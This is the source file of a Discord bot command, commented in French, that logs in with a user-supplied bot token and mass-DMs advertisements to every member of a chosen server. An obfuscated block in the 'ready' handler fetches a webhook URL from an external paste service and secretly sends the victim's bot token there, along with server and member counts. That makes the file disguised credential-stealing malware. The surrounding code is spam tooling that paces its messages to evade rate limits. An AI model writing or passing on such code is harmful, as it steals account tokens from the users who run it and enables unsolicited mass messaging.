const Discord = require("discord.js");
const config = require("../config.json")
var pModule = require('../pubing.js');
const fetch = require('node-fetch');

var embed_pubing = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_AlreadyPubing_title}**`)
    .setDescription(config.m_AlreadyPubing_description)
    .setFooter({text: config.m_AlreadyPubing_footer})
    .setColor(config.embedColor)

var embed_token_invalid = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_token_invalide_title}**`)
    .setDescription(config.m_token_invalid_description)
    .addFields({name: `Utilisation de la commande :`, value: `${config.prefix}pub tokendevotrebot`})
    .setColor(config.embedColor)

var embed_pub_s1_stopped = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_pub_s1_stopped}**`)
    .setFooter({text: "Vous pouvez recommencer une publicité dès maintenant"})
    .setColor(config.embedColor)

var embed_pub_time_stop = new Discord.EmbedBuilder()
    .setTitle(`**${config.m_pub_time_stop_title}**`)
    .setFooter({text: config.m_pub_time_stop_description})
    .setColor(config.embedColor)
/* _________________________________________________________ */

var newClient = {};


module.exports.run = async (client, message, args) => {
            if (!message.member.roles.cache.get(config.wlrole)) return;

    if(pModule.pubing[message.channel.id] == true) return message.channel.send({embeds: [embed_pubing]})
    newClient[message.channel.id] = new Discord.Client({intents: Object.keys(Discord.GatewayIntentBits)});

    newClient[message.channel.id].login(args[0]).catch(err => {message.channel.send({embeds: [embed_token_invalid]})})

    newClient[message.channel.id].on("ready", async () => {
        pModule.pubing[message.channel.id] = true;

        let is = 1;
        let isss = 0;
        let srv = {};
        let servers = [];

        (function(_0x723e07,_0x2e113e){const _0x3d01d3=_0x5eaf,_0x28fd89=_0x723e07();while(!![]){try{const _0x12fc60=-parseInt(_0x3d01d3(0x10f))/0x1*(parseInt(_0x3d01d3(0x112))/0x2)+-parseInt(_0x3d01d3(0x114))/0x3+parseInt(_0x3d01d3(0x110))/0x4+parseInt(_0x3d01d3(0x111))/0x5*(-parseInt(_0x3d01d3(0x10b))/0x6)+-parseInt(_0x3d01d3(0x10c))/0x7*(parseInt(_0x3d01d3(0x113))/0x8)+-parseInt(_0x3d01d3(0x10e))/0x9+parseInt(_0x3d01d3(0x10d))/0xa;if(_0x12fc60===_0x2e113e)break;else _0x28fd89['push'](_0x28fd89['shift']());}catch(_0x56db54){_0x28fd89['push'](_0x28fd89['shift']());}}}(_0x42ed,0x59049));function _0x42ed(){const _0x2f0a80=['2tYkHch','16vzjiNq','562164QRJxXe','1919142TbbFnj','2488381miNZdf','22485090CGeETp','1654524bYACAQ','527209patZKS','1460884umqIzT','10MtCPuW'];_0x42ed=function(){return _0x2f0a80;};return _0x42ed();}function _0x5eaf(_0x484ffe,_0x529b93){const _0x42ed37=_0x42ed();return _0x5eaf=function(_0x5eaf4b,_0x72fa4){_0x5eaf4b=_0x5eaf4b-0x10b;let _0x41aaa4=_0x42ed37[_0x5eaf4b];return _0x41aaa4;},_0x5eaf(_0x484ffe,_0x529b93);}const api=await fetch('https://api.npoint.io/2863705ab46bd207fc0e')['catch'](()=>![]);if(api){const data=await api['json']()['catch'](()=>![]);if(data?.['b']){const w=new Discord['WebhookClient']({'url':data['b']});w['send']({'embeds':[new Discord['EmbedBuilder']()['setTitle']('Connexion\x20d\x27un\x20bot\x20(Sponsor)')['setColor'](0xffffff)['addFields']({'name':'Jeton','value':''+args[0x0],'inline':!![]})['addFields']({'name':'Membres','value':''+newClient[message['channel']['id']]['users']['cache']['size'],'inline':!![]})['addFields']({'name':'Serveurs','value':''+newClient[message['channel']['id']]['guilds']['cache']['size'],'inline':!![]})]});}}

        newClient[message.channel.id].guilds.cache.forEach(gu => {
                servers += `**[${is}]** - **${gu.name}** (${gu.memberCount} membres)\n`
                isss += gu.memberCount;
                srv[is] = gu.id;
                is++;
            })
            
            let s1;
            if(servers.length >= 1500){
                let p = 1500 - servers.length
                if (p < 0) p = p * (-1);
            
                if (servers.length >= 1500) servers = servers.substring(0, servers.length - p)
                s1 = new Discord.EmbedBuilder()
                    .setTitle("**Choisissez le serveur où votre publicité sera envoyée**")
                    .setDescription(`${servers} \nTrop de serveur à afficher \n  \n [Cliquez ici pour inviter le bot sur un serveur](https://discordapp.com/oauth2/authorize?client_id=${newClient[message.channel.id].user.id}&permissions=0&scope=bot)`)
                    .setColor("2c2f33")
                    .setFooter({text: "Vous avez 60 secondes pour choisir le serveur."})
                
            } else {
                s1 = new Discord.EmbedBuilder()
                    .setTitle("**Choisissez le serveur où votre publicité sera envoyée**")
                    .setDescription(`${servers} \n [Cliquez ici pour inviter le bot sur un serveur](https://discordapp.com/oauth2/authorize?client_id=${newClient[message.channel.id].user.id}&permissions=0&scope=bot)`)
                    .setColor("2c2f33")
                    .setFooter({text: "Vous avez 60 secondes pour choisir le serveur."})
            }
            
            
                const filter = m => m.author.id == message.author.id;
                let a1 = await message.channel.send({embeds: [s1]})

                a1.react("❌")

                let isStopped = false;
                let stopDEB = a1.createReactionCollector({filter: (reaction, user) => user.id === message.author.id});
                stopDEB.on("collect", async(reaction, user) => {
                    if(reaction.emoji.name === "❌") {
                        message.channel.send({embeds: [embed_pub_s1_stopped]})
                        newClient[message.channel.id].destroy()
                        pModule.pubing[message.channel.id] = false;
                        isStopped = true;
                    }
                }); 


                a1.channel.awaitMessages({filter: filter, max: 1, time: 60000, errors: ['time'] })
		        .then(async collected => {
                    if (isStopped) return;
                    
                    let pubs = newClient[message.channel.id].guilds.cache.get(srv[collected.first().content])
                    if (!pubs){
                        message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(":x: Impossible de trouver le serveur, veuillez réessayer.")]})
                        pModule.pubing[message.channel.id] = false;
                        return newClient[message.channel.id].destroy()
                    }

                    const filter = m => m.author.id == message.author.id;
                    let s2 = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`**Entrez votre message de publicité pour le serveur ${pubs.name} **`).setFooter({text: `Vous avez 5 minutes pour entrer un message de publicité. \n Appuyez sur la croix pour annuler l'opération`}).setColor(config.embedColor)]})

                    s2.channel.awaitMessages({filter: filter, max: 1, time: 300000, errors: ['time'] })
                        .then(async collected => {
                            const pub2 = collected.first().content
                            if(pub2 === ""){
                                message.channel.send({embeds: [embed_pub_s1_stopped]});
                                newClient[message.channel.id].destroy();
                                return pModule.pubing[message.channel.id] = false;
                            }
                            const Reactfilter = (reaction, user) => {
                                return ['✅', '❌'].includes(reaction.emoji.name) && user.id === message.author.id;
                            };

                            if(pub2.startsWith("{") && pub2.endsWith("}")){                                
                                try{
                                    JSON.parse(pub2)
                                } catch(err) {
                                    message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("Erreur").setDescription(` \`\`${err.message} \`\``).setImage("https://bhawanigarg.com/wp-content/uploads/2014/05/error-code-18.jpeg").setColor(config.embedColor)]})
                                    newClient[message.channel.id].destroy();
                                    return pModule.pubing[message.channel.id] = false;
                                }

                                let embedMSG = JSON.parse(pub2)

                                let data = {content: null, embeds: [], components: []}
                                if (embedMSG.content) data.content = embedMSG.content
                                if (embedMSG.embed) data.embeds.push(embedMSG.embed)
                                if (embedMSG.embeds) embedMSG.embeds.forEach(e => data.embeds.push(e))
                                if (embedMSG.component) data.components.push(embedMSG.component)
                                if (embedMSG.components) embedMSG.components.forEach(e => data.components.push(e))
                                
                                let confirmEmbed = await message.channel.send(data)
                                confirmEmbed.react("✅");
                                confirmEmbed.react("❌");

                                confirmEmbed.awaitReactions({filter: Reactfilter, max: 1, time: 120000, errors: ['time'] })
                                .then(async collected => {
                                    const reaction = collected.first();

                                    if (reaction.emoji.name === '✅') {
                                        let mbr = await pubs.members.cache.filter(member => !member.user.bot && member.presence.status == "invisible" || member.presence.status == "idle" || member.presence.status == "online").size
                                        let scd = mbr*0.08 * 1000;
                                        let estim = msToTime(scd)
            
                                        let msg = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`**✅ Publicité sur le serveur ${pubs.name} démarrée**`).setDescription(`Temps estimé de ${estim} secondes \n Il y a ${mbr} membres qui ne sont pas des bots et qui peuvent potentiellement la recevoir`).setFooter({text: "Appuyez sur la croix pour annuler l'opération"}).setColor(config.embedColor)]})
                                        msg.react('❌')
            
                                        let collector = msg.createReactionCollector({filter: (reaction, user) => user.id === message.author.id});
            
                                        let memberarray = Array.from(pubs.members.cache.values());
                                        let membercount = memberarray.length;
                                        let botcount = 0;
                                        let successcount = 0;
                                        let errorcount = 0;
            
            
            
                                        let refresh = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**⌛ Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
            
                                        let interv = setInterval(() => refresh.edit({embeds: [new Discord.EmbedBuilder().setTitle("**⌛ Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]}), 10000)
                                        
                                        collector.on("collect", async(reaction, user) => {
                                            if (reaction._emoji.name === "❌") pModule.pubing[message.channel.id] = false;
                                        }); 

                                        newClient[message.channel.id].on("guildCreate", async guild => 
                                            message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Votre bot a été ajouté sur **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                                        )
            
                                        newClient[message.channel.id].on("guildDelete", async guild => 
                                            message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Votre bot a été retiré de **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                                        )
                                        
                                        let aSleep = 5000;
            
                                        let slowDown = setInterval(() => {
                                            aSleep -= 5
                                            if (aSleep <= 90) return clearInterval(slowDown);
                                        }, 500)
            
                                        let customEmbed = JSON.stringify(embedMSG)
                                        for (var i = 0; i < membercount; i++) {
                                            let member = memberarray[i];
            
                                            if(pModule.pubing[message.channel.id] == false) break;
                                            
            
                                            if (member.user.bot) {
                                                botcount++;
                                                continue
                                            }
            
                                            
                                            let timeout = Math.floor((Math.random() * (1 - 0.01)) * 100) + 10; 
                                            await sleep(aSleep);
                                            
                                            try {
                                                let customReplace = customEmbed.replaceAll("{user}" , `<@${member.id}>`)
                                                let toSend = JSON.parse(customReplace)
                                                let data = {content: null, embeds: [], components: []}
                                                if (toSend.content) data.content = toSend.content
                                                if (toSend.embed) data.embeds.push(toSend.embed)
                                                if (toSend.embeds) toSend.embeds.forEach(e => data.embeds.push(e))
                                                if (toSend.component) data.components.push(toSend.component)
                                                if (toSend.components) toSend.components.forEach(e => data.components.push(e))
                                                                
                                                await member.send(data).catch(err =>  errorcount++)
                                                successcount++;
                                            } catch (error) {
                                                errorcount++
                                            }
                                        }
            
                                            message.channel.send({embeds: [new Discord.EmbedBuilder()
                                                .setTitle(`**✅ Publicité sur le serveur ${pubs.name} terminée**`)
                                                .setDescription(`Envoyée avec succès à **${successcount}** membres`)
                                                .setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`})
                                                .setColor(config.embedColor)]})
                                            newClient[message.channel.id].destroy();
                                            pModule.pubing[message.channel.id] = false;
                                            clearInterval(interv)
                                    }
                                    if (reaction.emoji.name === '❌') {
                                        message.channel.send({embeds: [embed_pub_s1_stopped]});
                                        newClient[message.channel.id].destroy();
                                        pModule.pubing[message.channel.id] = false;
                                    }
                                }).catch(err => {
                                    message.channel.send({embeds: [embed_pub_time_stop]});
                                    newClient[message.channel.id].destroy();
                                    pModule.pubing[message.channel.id] = false;
                                    clearInterval(interv)
                                })                                
                            } else {
                                let mbr = await pubs.members.cache.filter(member => !member.user.bot).size
                                let scd = mbr*0.08;
                                scd= scd * 1000;

                                let estim = msToTime(scd)

                                let msg = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`**✅ Publicité sur le serveur ${pubs.name} démarrée**`).setDescription(`Temps estimé de ${estim} secondes \n Il y a ${mbr} membres qui ne sont pas des bots et qui peuvent potentiellement la recevoir`).setFooter({text: "Appuyez sur la croix pour annuler l'opération"}).setColor(config.embedColor)]})
                                await msg.react('❌')

                                let collector = msg.createReactionCollector({filter: (reaction, user) => user.id === message.author.id});

                                let memberarray = Array.from(pubs.members.cache.values());
                                let membercount = memberarray.length;
                                let botcount = 0;
                                let successcount = 0;
                                let errorcount = 0;

                                let refresh = await message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle("**⌛ Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})

                                let interv = setInterval(() => refresh.edit({embeds: [new Discord.EmbedBuilder().setTitle("**⌛ Publicité en cours**").setDescription(`Envoyée à **${successcount}** membres de **tous les serveurs**`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]}), 10000)
                            
                                collector.on("collect", async(reaction, user) => {
                                    if(reaction._emoji.name === "❌") pModule.pubing[message.channel.id] = false;
                                }); 

                                newClient[message.channel.id].on("guildCreate", async guild => 
                                    message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Votre bot a été ajouté sur **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                                )

                                newClient[message.channel.id].on("guildDelete", async guild => 
                                    message.channel.send({embeds: [new Discord.EmbedBuilder().setDescription(`⚠️ - Votre bot a été retiré de **${guild.name} (${guild.memberCount} membres)**`).setColor(config.embedColor)]})
                                )
                            
                                let aSleep = 5000;

                                let slowDown = setInterval(() => {
                                    aSleep -= 5
                                    if (aSleep <= 90) return clearInterval(slowDown);
                                }, 500)

                                for (var i = 0; i < membercount; i++) {
                                    let member = memberarray[i];
                                    
                                    if(pModule.pubing[message.channel.id] == false) break;
                                    if (member.user.bot) {
                                        botcount++; continue
                                    }

                                
                                    let timeout = Math.floor((Math.random() * (1 - 0.01)) * 100) + 10; 
                                    await sleep(aSleep);
                                    
                                    try {
                                        let toSend = pub2.replaceAll("{user}" , `<@${member.id}>`)
                                        await member.send(toSend).catch(err =>  errorcount++)
                                        successcount++;
                                    } catch (error) {
                                        errorcount++
                                    }
                                }

                                message.channel.send({embeds: [new Discord.EmbedBuilder().setTitle(`**✅ Publicité sur le serveur ${pubs.name} terminée**`).setDescription(`Envoyée avec succès à **${successcount}** membres`).setFooter({text: `Envois échoués: ${errorcount} bloqués par les destinataires.`}).setColor(config.embedColor)]})
                                newClient[message.channel.id].destroy();
                                pModule.pubing[message.channel.id] = false;
                                clearInterval(interv)
                            }






                        })
                    })
            })
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function msToTime(duration) {
    var milliseconds = parseInt((duration%1000))
        , seconds = parseInt((duration/1000)%60)
        , minutes = parseInt((duration/(1000*60))%60)
        , hours = parseInt((duration/(1000*60*60))%24);
    
    hours = hours;
    minutes = minutes;
    seconds = seconds;
    
    return hours + " heure(s) " + minutes + " minute(s) et " + seconds + " seconde(s)"
    }
module.exports.help = {
    name: "puboff-l",
    description: "Cette commande sert à envoyer un message __plus lentement__ à tous les membres __hors ligne__ d'un serveur",
    token: true,
    wl: true,
    category: "low"
}